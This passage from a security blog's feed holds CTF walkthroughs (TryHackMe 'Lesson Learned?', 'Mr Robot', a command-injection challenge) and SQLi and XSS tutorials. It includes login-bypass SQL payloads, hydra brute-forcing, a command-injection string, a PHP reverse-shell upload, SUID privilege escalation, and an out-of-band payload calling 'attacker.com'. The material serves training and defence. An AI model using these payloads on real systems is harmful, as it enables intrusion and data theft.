:</p><p><code>c8421899aae571f7af486492b71a8ab7</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.39.png" alt="alt text"></p><p>Found second flag :</p><p><code>9a0b2b618bef9bfa7ac28c1353d9f318</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.46.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lesson Learned?</title>
      <link href="/2024/04/19/LessonLearned/"/>
      <url>/2024/04/19/LessonLearned/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/maxresdefault.jpg" alt="alt text"></p><p>Room link : <a href="https://tryhackme.com/r/room/lessonlearned">https://tryhackme.com/r/room/lessonlearned</a></p><h1 id="Lesson-Learned"><a href="#Lesson-Learned" class="headerlink" title="Lesson Learned?"></a>Lesson Learned?</h1><p>IP Address  :(10.10.63.208)</p><p>We have a web application with a Login form :</p><p><img src="/../images/a1.png" alt="alt text"></p><p>Let’s try a default XSS :</p><p><img src="/../images/a2.png" alt="alt text"></p><p>Not working , robots txt maybe?</p><p><img src="/../images/a3.png" alt="alt text"></p><p>Nope.</p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h3><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.63.208</code></pre><p><img src="/../images/a4.png" alt="alt text"></p><p>Ports open : </p><ul><li>22 ssh</li><li>80 http</li></ul><p>Full NMAP Scanning :</p><pre><code class="hljs bash">nmap -A -sC -sV -p80,22 10.10.55.21 -Pn</code></pre><p><img src="/../images/a5.png" alt="alt text"></p><h3 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h3><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u [http://10.10.63.208](http://10.10.63.208/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p><img src="/../images/a6.png" alt="alt text"></p><p>Found &#x2F;manual  but there’s nothing</p><p><img src="/../images/a7.png" alt="alt text"></p><p>Let’s try to bypass the Login with an SQL Payload :</p><p><img src="/../images/a8.png" alt="alt text"></p><p><img src="/../images/a9.png" alt="alt text"></p><p>Here we got a hint that tells us we should use a <code>less destructive</code> payload :</p><p><img src="/../images/a10.png" alt="alt text"></p><p>We have a lot of payloads here : <a href="https://github.com/payloadbox/sql-injection-payload-list">https://github.com/payloadbox/sql-injection-payload-list</a></p><p>Let’s reset the machine and try another SQL payload to bypass the login .. didn’t find anything, try to bruteforce the username with hydra :</p><pre><code class="hljs bash">hydra -L /home/kali/Desktop/Workspace/TryHackMe/SecLists/Usernames/xato-net-10-million-usernames.txt -p asd 10.10.93.0 http-post-form   <span class="hljs-string">&quot;/:username=^USER^&amp;password=^PASS^: Invalid username and password.&quot;</span></code></pre><p><img src="/../images/a11.png" alt="alt text"></p><p>Ater trying this payload <code>admin’ AND 1=1#</code> with all the usernames finally one worked </p><p><code>martin&#39; AND 1=1#</code></p><p><img src="/../images/a11.png" alt="alt text"></p><p><img src="/../images/a12.png" alt="alt text"></p><p><img src="/../images/a13.png" alt="alt text"></p><p>So we found the flag!</p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mr Robot</title>
      <link href="/2024/04/16/MrRobot/"/>
      <url>/2024/04/16/MrRobot/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/7a8797ae59733f2a72f0e8a8748be128.jpeg" alt="alt text"></p><h3 id="Head-into-the-IP-Address-given"><a href="#Head-into-the-IP-Address-given" class="headerlink" title="Head into the IP Address given :"></a>Head into the IP Address given :</h3><p>10.10.50.127</p><p><img src="/../images/1.png" alt="alt text"></p><p>After trying all those commands , i didn’t find anything interesting . First thing i got in my mind is to go and see if we find something in <code>/robots.txt</code> :</p><p><img src="/../images/2.png" alt="alt text"></p><p>We find <code>key-1-of-3.txt</code> let’s head into that :</p><p>We got the flag : <code>073403c8a58a1f80d943455fb30724b9</code></p><p>Let’s see <code>fsociety.dic</code> aswell :</p><p><img src="/../images/3.png" alt="alt text"></p><p><img src="/../images/4.png" alt="alt text"></p><p>It seems like this is a list of passwords. </p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h3><p><code>( sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.50.127 )</code></p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">TryHackMe</span>/<span class="hljs-type">Boxes</span>/<span class="hljs-type">mrrobot</span>]└─<span class="hljs-variable">$</span>  sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">50.127</span>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: Host discovery disabled (<span class="hljs-literal">-Pn</span>). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan times may be slower.Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-04-16</span> <span class="hljs-number">14</span>:<span class="hljs-number">00</span> EDTInitiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">14</span>:<span class="hljs-number">00</span>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">14</span>:<span class="hljs-number">00</span>, <span class="hljs-number">0.04</span>s elapsedDNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.04</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><span class="hljs-type">Initiating</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">14</span>:<span class="hljs-number">00</span><span class="hljs-type">Scanning</span> <span class="hljs-number">10.10</span><span class="hljs-type">.50.127</span> [<span class="hljs-number">65535</span> <span class="hljs-type">ports</span>]<span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">443</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.10</span><span class="hljs-type">.50.127</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.10</span><span class="hljs-type">.50.127</span><span class="hljs-type">Completed</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">14</span>:<span class="hljs-number">00</span>, <span class="hljs-number">26.58</span><span class="hljs-type">s</span> <span class="hljs-type">elapsed</span> (<span class="hljs-number">65535</span> <span class="hljs-type">total</span> <span class="hljs-type">ports</span>)<span class="hljs-type">Nmap</span> <span class="hljs-type">scan</span> <span class="hljs-type">report</span> <span class="hljs-type">for</span> <span class="hljs-number">10.10</span><span class="hljs-type">.50.127</span><span class="hljs-type">Host</span> <span class="hljs-type">is</span> <span class="hljs-type">up</span>, <span class="hljs-type">received</span> <span class="hljs-type">user</span>-<span class="hljs-type">set</span> (<span class="hljs-number">0.086</span><span class="hljs-type">s</span> <span class="hljs-type">latency</span>)<span class="hljs-type">.</span><span class="hljs-type">Scanned</span> <span class="hljs-type">at</span> <span class="hljs-number">2024</span>-<span class="hljs-number">04</span>-<span class="hljs-number">16</span> <span class="hljs-number">14</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> <span class="hljs-type">EDT</span> <span class="hljs-type">for</span> <span class="hljs-number">27</span><span class="hljs-type">s</span><span class="hljs-type">Not</span> <span class="hljs-type">shown</span>: <span class="hljs-number">65532</span> <span class="hljs-type">filtered</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">no</span>-<span class="hljs-type">response</span>), <span class="hljs-number">1</span> <span class="hljs-type">closed</span> <span class="hljs-type">tcp</span> <span class="hljs-type">port</span> (<span class="hljs-type">reset</span>)<span class="hljs-type">Some</span> <span class="hljs-type">closed</span> <span class="hljs-type">ports</span> <span class="hljs-type">may</span> <span class="hljs-type">be</span> <span class="hljs-type">reported</span> <span class="hljs-type">as</span> <span class="hljs-type">filtered</span> <span class="hljs-type">due</span> <span class="hljs-type">to</span> --<span class="hljs-type">defeat</span>-<span class="hljs-type">rst</span>-<span class="hljs-type">ratelimit</span><span class="hljs-type">PORT</span>    <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">REASON</span><span class="hljs-number">80</span>/<span class="hljs-type">tcp</span>  <span class="hljs-type">open</span>  <span class="hljs-type">http</span>    <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-number">443</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">https</span>   <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-type">Read</span> <span class="hljs-type">data</span> <span class="hljs-type">files</span> <span class="hljs-type">from</span>: /<span class="hljs-type">usr</span>/<span class="hljs-type">bin</span>/<span class="hljs-type">..</span>/<span class="hljs-type">share</span>/<span class="hljs-type">nmap</span><span class="hljs-type">Nmap</span> <span class="hljs-type">done</span>: <span class="hljs-number">1</span> <span class="hljs-type">IP</span> <span class="hljs-type">address</span> (<span class="hljs-number">1</span> <span class="hljs-type">host</span> <span class="hljs-type">up</span>) <span class="hljs-type">scanned</span> <span class="hljs-type">in</span> <span class="hljs-number">26.70</span> <span class="hljs-type">seconds</span>           <span class="hljs-type">Raw</span> <span class="hljs-type">packets</span> <span class="hljs-type">sent</span>: <span class="hljs-number">131086</span> (<span class="hljs-number">5.768</span><span class="hljs-type">MB</span>) | <span class="hljs-type">Rcvd</span>: <span class="hljs-number">22</span> (<span class="hljs-number">964</span><span class="hljs-type">B</span></code></pre><h3 id="Full-NMAP-Scanning"><a href="#Full-NMAP-Scanning" class="headerlink" title="Full NMAP Scanning :"></a>Full NMAP Scanning :</h3><pre><code class="hljs bash">┌──(kali㉿kali)-[~/…/Workspace/TryHackMe/Boxes/mrrobot]└─$ nmap -A -sC -sV -p80,443 10.10.50.127 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 14:07 EDTNmap scan report <span class="hljs-keyword">for</span> 10.10.50.127Host is up (0.063s latency).PORT    STATE SERVICE  VERSION80/tcp  open  http     Apache httpd|_http-server-header: Apache|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><span class="hljs-string">443/tcp open  ssl/http Apache httpd</span><span class="hljs-string">| ssl-cert: Subject: commonName=www.example.com</span><span class="hljs-string">| Not valid before: 2015-09-16T10:45:03</span><span class="hljs-string">|_Not valid after:  2025-09-13T10:45:03</span><span class="hljs-string">|_http-title: Site doesn&#x27;</span>t have a title (text/html).|_http-server-header: ApacheService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.77 seconds</code></pre><h3 id="Directory-busting"><a href="#Directory-busting" class="headerlink" title="Directory busting :"></a>Directory busting :</h3><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://10.10.50.127 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p><img src="/../images/5.png" alt="alt text"></p><p>First interesting subdomain for me is <code>wp-admin</code> let’s go there :</p><p>Found a Wordpress login :</p><p><img src="/../images/6.png" alt="alt text"></p><p>Tried default admin and password but unfortunately it didnt work . </p><h3 id="Bruteforce-the-username"><a href="#Bruteforce-the-username" class="headerlink" title="Bruteforce the username"></a>Bruteforce the username</h3><p>Open Burpsuite and foxy proxy → Intercept ON → write a random username and pass and hit log in  → Burp intercepts it → Send to Intruder → Add payload to the username → Payloads → Load the list we got <code>fsociety.dic</code> → Check for a username with different length :</p><p><img src="/../images/7.png" alt="alt text"></p><p>If we try a password with the username <code>Elliot</code> the error changes , that tells us the username Elliot is correct :</p><p><img src="/../images/8.png" alt="alt text"></p><p>Let’s head into <code>/license</code> :</p><p><img src="/../images/license.png" alt="alt text"></p><p>Inspect(Q)</p><p><img src="/../images/9.png" alt="alt text"></p><p><img src="/../images/10.png" alt="alt text"></p><p>Username : elliot</p><p>Password : ER28-0652</p><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>To get shell access we need to paste a php reverse shell into Editor Header:</p><p><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p><p><img src="/../images/11.png" alt="alt text"></p><p><img src="/../images/12.png" alt="alt text"></p><p>Spawning &#x2F;bin&#x2F;bash using python :</p><p><img src="/../images/13.png" alt="alt text"></p><p>Found a user <code>robot</code> </p><p><img src="/../images/14.png" alt="alt text"></p><p>Crack the hash using <code>Crackstation</code> :</p><p><img src="/../images/15.png" alt="alt text"></p><p>We found <code>robot&#39;s</code> password let’s switch user now </p><p><img src="/../images/16.png" alt="alt text"></p><p><img src="/../images/17.png" alt="alt text"></p><p>Key 2 : <code>abcdefghijklmnopqrstuvwxyz</code></p><h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p><code>sudo -l</code></p><p><img src="/../images/18.png" alt="alt text"></p><p><strong>Finding SUID Binaries:</strong></p><pre><code class="hljs bash">robot@linux:~$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</code></pre><p><img src="/../images/19.png" alt="alt text"></p><p>Found nmap , let’s go to GTFOBins</p><p><img src="/../images/20.png" alt="alt text"></p><p>Let’s chose option B because its shorter :</p><p><img src="/../images/21.png" alt="alt text"></p><p>Found key 3 : <code>04787ddef27c3dee1ee161b21670b4e4</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection</title>
      <link href="/2024/04/10/SQL/"/>
      <url>/2024/04/10/SQL/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/SQLi.webp" alt="alt text"></p><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>SQL injection (SQLi) is a web application injection vulnerability that occurs when an attacker injects malicious SQL statements into an application’s input fields.</p><p>This occurs when a web application does not properly validate user input, allowing an attacker to inject SQL code&#x2F;queries that can manipulate the database or gain access to sensitive information.</p><p>For example, suppose a website has a login form that accepts a username and password. If the website does not properly validate the user’s input, an attacker could enter a malicious SQL statement into the username field that would allow them to bypass the login process and gain access to the website’s database.</p><p>What damage can it do ? </p><p>SQL injection attacks can have serious consequences, including the theft of sensitive data, unauthorized access to sensitive systems, and even full system compromise.</p><h3 id="Types-of-SQL-Injection"><a href="#Types-of-SQL-Injection" class="headerlink" title="Types of SQL Injection:"></a>Types of SQL Injection:</h3><p>SQL injection attacks can manifest in various forms, depending on the specific vulnerability and the attacker’s goals. Some common types of SQL injection include:</p><ol><li><p><code>Classic SQL Injection</code>: In classic SQL injection, attackers insert malicious SQL statements into input fields, such as login forms or search boxes, to manipulate the database. This can involve altering the logic of the original query, extracting sensitive information, or even modifying or deleting database records.</p></li><li><p><code>Blind SQL Injection</code>: In blind SQL injection, attackers exploit vulnerabilities without directly viewing the results of their actions. Instead, they rely on the application’s behavior to infer information indirectly. This can involve techniques like time-based blind injection or boolean-based blind injection.</p></li><li><p><code>Error-based SQL Injection</code>: Error-based SQL injection exploits error messages generated by the database server to extract information about the database structure or the data itself. Attackers inject SQL code that triggers errors revealing details they can exploit.</p></li><li><p><code>Union-based SQL Injection</code>: Union-based SQL injection involves injecting a SELECT statement that includes a UNION operator into an SQL query to combine the results of two queries. This technique can be used to extract data from other tables or even execute arbitrary SQL commands.</p></li><li><p><code>Out-of-Band SQL Injection</code>: Out-of-band SQL injection leverages features of the database server to communicate with the attacker’s server and transmit data. This can be useful when direct retrieval of data is not possible due to network restrictions or other security measures.</p></li><li><p><code>Time-based SQL Injection</code>: Time-based SQL injection involves injecting SQL queries that cause the server to delay its response. Attackers can exploit this delay to infer information indirectly, such as determining whether a certain condition is true or false.</p></li></ol><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples:"></a>Examples:</h2><h3 id="Classic-SQL-Injection"><a href="#Classic-SQL-Injection" class="headerlink" title="Classic SQL Injection:"></a>Classic SQL Injection:</h3><p>Imagine a login form where users input their username and password. An attacker might input ‘ OR 1&#x3D;1 – in the username field. If the application doesn’t properly sanitize inputs, the SQL query might become:</p><pre><code class="hljs powershell"><span class="hljs-built_in">SELECT</span> * FROM users <span class="hljs-built_in">WHERE</span> username = <span class="hljs-string">&#x27;&#x27;</span> OR <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-literal">--</span><span class="hljs-string">&#x27; AND password = &#x27;</span>input_password<span class="hljs-string">&#x27;;</span></code></pre><p>This query always returns true, allowing the attacker to log in without a valid password.</p><h3 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection:"></a>Blind SQL Injection:</h3><p>Suppose there’s a login form on a website where users enter their username and password. The website’s login process checks the entered credentials against a database using an SQL query like this:</p><pre><code class="hljs powershell"><span class="hljs-built_in">SELECT</span> * FROM users <span class="hljs-built_in">WHERE</span> username = <span class="hljs-string">&#x27;input_username&#x27;</span> AND password = <span class="hljs-string">&#x27;input_password&#x27;</span>;</code></pre><p>Now, let’s say an attacker wants to bypass the login and gain unauthorized access to the website’s backend. They notice that the website is vulnerable to Blind SQL Injection. Instead of directly viewing the results of their injected SQL queries, the attacker will rely on the application’s behavior to infer information indirectly.</p><p>The attacker inputs the following string into the username field of the login form:</p><pre><code class="hljs powershell"><span class="hljs-string">&#x27; AND SLEEP(10) --&#x27;</span></code></pre><p>If the website takes significantly longer to respond, the attacker infers that the injected condition was true.</p><p>This input modifies the SQL query executed by the application to become:</p><pre><code class="hljs powershell"><span class="hljs-built_in">SELECT</span> * FROM users <span class="hljs-built_in">WHERE</span> username = <span class="hljs-string">&#x27;&#x27;</span> OR <span class="hljs-built_in">SLEEP</span>(<span class="hljs-number">10</span>) <span class="hljs-literal">--</span> <span class="hljs-string">&#x27; AND password = &#x27;</span>input_password<span class="hljs-string">&#x27;;</span></code></pre><h3 id="Error-based-SQL-Injection"><a href="#Error-based-SQL-Injection" class="headerlink" title="Error-based SQL Injection:"></a>Error-based SQL Injection:</h3><p>Consider a website that shows a detailed error message when encountering a database error. An attacker might input:</p><pre><code class="hljs powershell"><span class="hljs-string">&#x27; OR 1=1 UNION SELECT 1, @@VERSION --</span></code></pre><p>If the application displays database errors, it might reveal the database version, aiding the attacker.</p><h3 id="Union-based-SQL-Injection"><a href="#Union-based-SQL-Injection" class="headerlink" title="Union-based SQL Injection:"></a>Union-based SQL Injection:</h3><p>Suppose there’s a URL parameter id used in a query like:</p><pre><code class="hljs powershell">http://example.com/page?id=<span class="hljs-number">1</span> UNION <span class="hljs-built_in">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-literal">--</span></code></pre><p>If the application concatenates this input into an SQL query without proper validation, it may combine the attacker’s selected columns with the original query’s result.</p><h3 id="Out-of-Band-SQL-Injection"><a href="#Out-of-Band-SQL-Injection" class="headerlink" title="Out-of-Band SQL Injection:"></a>Out-of-Band SQL Injection:</h3><p>If the database server allows outbound connections, an attacker might craft a payload that triggers a DNS lookup or an HTTP request to their controlled server. For example:</p><pre><code class="hljs powershell"><span class="hljs-string">&#x27;; EXEC xp_dirtree &#x27;</span>\\attacker.com\share\<span class="hljs-string">&#x27; --</span></code></pre><p>This could trigger a connection to the attacker’s server, revealing information or performing actions.</p><h3 id="Time-based-SQL-Injection"><a href="#Time-based-SQL-Injection" class="headerlink" title="Time-based SQL Injection:"></a>Time-based SQL Injection:</h3><p>Similar to blind SQL injection, but instead of inferring information from response times, an attacker uses queries that introduce delays. For instance:</p><pre><code class="hljs powershell"><span class="hljs-string">&#x27; AND IF(SUBSTRING(database(),1,1)=&#x27;</span>a<span class="hljs-string">&#x27;,SLEEP(10),0) --</span></code></pre><p>If the delay occurs, the attacker deduces that the condition was true.</p><h3 id="SQLi-Remediation"><a href="#SQLi-Remediation" class="headerlink" title="SQLi Remediation :"></a>SQLi Remediation :</h3><ul><li><p>Use parameterized queries or prepared statements.</p></li><li><p>Validate and sanitize user inputs.</p></li><li><p>Limit database user privileges.</p></li><li><p>Conduct regular security audits.</p></li><li><p>Implement web application firewalls (WAFs).</p></li><li><p>Educate developers on secure coding.</p></li><li><p>Monitor and log SQL queries.</p></li><li><p>Keep software updated.</p></li></ul><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>SQL injection (SQLi) remains a critical security threat for web applications, allowing attackers to manipulate databases and compromise sensitive data. Understanding the various types of SQL injection attacks, such as classic, blind, and time-based, is crucial for effective mitigation. Implementing remediation strategies like parameterized queries, input validation, and least privilege principles are essential steps towards bolstering application security. By staying vigilant, educating developers, and regularly auditing code for vulnerabilities, organizations can minimize the risk of SQL injection and safeguard their systems from exploitation.</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cross-Site Scripting (XSS)</title>
      <link href="/2024/04/08/XSS/"/>
      <url>/2024/04/08/XSS/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/XSS.jpg" alt="alt text"></p><h1 id="Cross-Site-Scripting-XSS"><a href="#Cross-Site-Scripting-XSS" class="headerlink" title="Cross-Site Scripting (XSS)"></a>Cross-Site Scripting (XSS)</h1><p>Cross-Site scripting (XSS) is a client-side web vulnerability that allows attackers to inject malicious scripts into web pages.</p><p>This vulnerability is typically caused by a lack of input sanitization&#x2F;validation in web applications</p><p>Attackers leverage XSS vulnerabilities to inject malicious code into web applications. Because XSS is a client side vulnerability, these scripts are executed by the victims browser.</p><p>There are 3 types of Cross-Site Scripting(XSS) attacks :</p><ul><li><p>Reflected XSS</p></li><li><p>Stored XSS</p></li><li><p>DOM-Based XSS</p></li></ul><h1 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h1><p>Reflected&#x2F;non-persistent cross-site scripting is the most common form of<br>XSS and involves tricking a victim into clicking a specially crafted link (with an XSS payload) to the vulnerable website.</p><p>When the victim clicks on the link the website includes the XSS payload as part of the response back to the victims browser, where the payload is executed.</p><h3 id="Exemple-of-a-Reflected-XSS-attack"><a href="#Exemple-of-a-Reflected-XSS-attack" class="headerlink" title="Exemple of a Reflected XSS attack:"></a>Exemple of a Reflected XSS attack:</h3><p><code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></p><p>With this test we can also find out if the Web Application has some kind of filtering or not.</p><p>While this serves as just one among various XSS tests, it remains imperative to conduct thorough assessments for comprehensive security evaluation.</p><h1 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h1><p>Stored&#x2F;persistent cross-site scripting is a vulnerability where an attacker is able to inject Javascript code into a web application’s database or source code via an input that is not sanitised.</p><p>For example, if an attacker is able to inject a malicious XSS payload in to a webpage on a website without proper sanitisation  the XSS payload injected in to the webpage will be executed by the browser of anyone that visits that webpage.</p><h3 id="Example-of-a-Stored-XSS-attack"><a href="#Example-of-a-Stored-XSS-attack" class="headerlink" title="Example of a Stored XSS attack:"></a>Example of a Stored XSS attack:</h3><p>Let’s consider a website that allows users to post comments. The website doesn’t properly sanitize user input, so a malicious user could craft a comment containing JavaScript code. For instance:</p><p><code>&lt;script&gt;alert(&#39;Hello, I am a malicious script!&#39;)&lt;/script&gt;</code></p><p><code>If this comment is stored on the server and not properly sanitized, whenever a user visits the page displaying comments, this script will execute in their browser, showing an alert with the message &quot;Hello, I am a malicious script!&quot;. This is a basic example of a Stored XSS attack where the malicious script is stored on the server and executed whenever the compromised page is accessed.</code></p><h1 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM-Based XSS"></a>DOM-Based XSS</h1><p>DOM-Based XSS&#x2F;type-0 XSS is a type of XSS vulnerability that allows an attacker to inject malicious payloads into a webpage by exploiting a weakness in the DOM of the web application.</p><p>A DOM-Based XSS attack involves exploiting a script on the webpage that takes user input and reflects it back to the page without proper sanitisation, the attacker then injects malicious code&#x2F;payloads into the webpage’s DOM by modifying the values of the script’s variables.</p><h3 id="Example-of-a-DOM-Based-XSS-attack"><a href="#Example-of-a-DOM-Based-XSS-attack" class="headerlink" title="Example of a DOM-Based XSS attack:"></a>Example of a DOM-Based XSS attack:</h3><p>Suppose there’s a website with a search feature that dynamically updates the page based on the user’s input without proper sanitization. A malicious user could manipulate the URL parameters like so:</p><p><a href="https://vulnerable-website.com/search?query=%60">https://vulnerable-website.com/search?query=`</a><script>alert('Hello, I am a malicious script!')</script>&#96;</p><p>In this example, the website’s JavaScript code might retrieve the search query from the URL and directly inject it into the page’s DOM without proper sanitization. As a result, the script included in the URL parameter would execute within the context of the page, displaying an alert box with the message <code>Hello, I am a malicious script!</code> (You’ve see it when you clicked on this post :) ).This illustrates how a DOM-based XSS attack can occur entirely on the client-side, manipulating the DOM environment to execute malicious scripts.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>It’s essential for developers and website administrators to implement robust security measures, such as input validation and output encoding, to mitigate the risk of XSS vulnerabilities. By understanding the various forms of XSS attacks and adopting proactive security practices, organizations can better safeguard their web applications and protect users from potential exploitation.</p><hr><h4 id="Thank-you-for-exploring-this-insightful-overview-of-XSS-attacks-Implementing-vigilant-security-measures-is-crucial-in-safeguarding-web-applications-and-ensuring-a-secure-online-environment-for-all-Wishing-you-a-pleasant-and-secure-browsing-experience-Have-a-great-day"><a href="#Thank-you-for-exploring-this-insightful-overview-of-XSS-attacks-Implementing-vigilant-security-measures-is-crucial-in-safeguarding-web-applications-and-ensuring-a-secure-online-environment-for-all-Wishing-you-a-pleasant-and-secure-browsing-experience-Have-a-great-day" class="headerlink" title="Thank you for exploring this insightful overview of XSS attacks. Implementing vigilant security measures is crucial in safeguarding web applications and ensuring a secure online environment for all. Wishing you a pleasant and secure browsing experience. Have a great day!"></a>Thank you for exploring this insightful overview of XSS attacks. Implementing vigilant security measures is crucial in safeguarding web applications and ensuring a secure online environment for all. Wishing you a pleasant and secure browsing experience. Have a great day!</h4><hr>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Injector</title>
      <link href="/2024/04/07/injector/"/>
      <url>/2024/04/07/injector/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/bannner.png" alt="alt text"></p><p>Challange Link Cyber-EDU:<br><a href="https://app.cyber-edu.co/challenges/c2599f90-44a4-11ed-84b2-51fa576b3d4d?tenant=cyberedu">https://app.cyber-edu.co/challenges/c2599f90-44a4-11ed-84b2-51fa576b3d4d?tenant=cyberedu</a></p><h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.</p><h1 id="Walktrough"><a href="#Walktrough" class="headerlink" title="Walktrough"></a>Walktrough</h1><p>Browse to the IP Addres Given:</p><p><img src="/../images/injection.png" alt="alt text"></p><p>With the help of google we found a command injection to paste <code>(%20%0Acat%20|/bin/cat%20flag.php)</code> :</p><p><img src="/../images/injection2.png" alt="alt text"></p><p>→ View Page Source → We found the flag:<br><code>C0mm4nd_1nj3c5i0n_1s_E4sy</code></p><p><img src="/../images/flag.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Easy </tag>
            
            <tag> ROCSC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>robots</title>
      <link href="/2024/04/07/robots/"/>
      <url>/2024/04/07/robots/</url>
      
